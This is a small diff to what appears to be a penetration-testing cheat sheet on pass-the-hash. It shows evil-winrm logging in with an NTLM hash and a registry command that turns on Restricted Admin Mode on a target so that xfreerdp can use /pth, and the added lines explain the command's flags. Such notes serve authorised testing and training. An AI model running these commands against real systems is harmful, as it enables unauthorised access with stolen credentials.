@@ -56,6 +56,12 @@ evil-winrm -i $IP -u $USERNAME -H $HASH
 	- Precondition: Restricted Admin Mode must be enabled on the TARGET
 	```cmd
 	reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+	
+	# Options:
+	/t: Type of the registry
+	/v: Name of the add of the registry
+	/d: data of the added registry
+	/f: Add the registry without confirmation
 	```
 	- Run xfreerdp with /pth flag
 	```bash
